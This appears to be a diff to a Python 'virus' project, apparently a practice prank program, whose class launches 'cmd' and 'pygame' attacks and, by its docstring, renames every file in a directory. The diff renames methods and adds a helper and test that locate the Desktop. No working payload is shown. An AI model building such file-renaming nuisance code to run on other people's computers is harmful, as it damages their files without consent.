@@ -10,7 +10,7 @@ from Basics.rename_test.virus_rename import (
 )
 
 
-class VirusExecutor:
+class VirusExecutor(object):
     def __init__(self, cmd_attacks_amount: int = 30, finish_dir_path: Path = RENAME_CURRENT_DIR):
         """Конструктор класса.
 
@@ -31,7 +31,7 @@ class VirusExecutor:
         """
         self.launch_cmd_atack()
         self.launch_pygame_atack()
-        self.finish()
+        self.launch_finish_atack()
 
     def launch_cmd_atack(self):
         """Запуск серии атак на cmd."""
@@ -71,7 +71,7 @@ class VirusExecutor:
             except KeyboardInterrupt:
                 break
 
-    def finish(self):
+    def launch_finish_atack(self):
         """Финиширующая инструкция.
 
         Переименовывает все файлы в директории."""
@@ -88,6 +88,20 @@ class WindowsVirusExecutor(VirusExecutor):
 class MacOSVirusExecutor(VirusExecutor):
     def cmd_attack(self):
         print("ATTACK!")
+
+
+def find_path_to_desktop() -> Path:
+    return Path("Desktop")
+
+
+def test_find_path_to_desktop():
+    path_to_desktop = find_path_to_desktop()
+    expected_dirs = frozenset(("Этот компьютер", "Корзина"))
+    for maybe_dir in path_to_desktop.iterdir():
+        if maybe_dir.name in expected_dirs:
+            print("OK")
+            return
+    raise Exception("It is not Desktop!")
 
 
 if __name__ == "__main__":
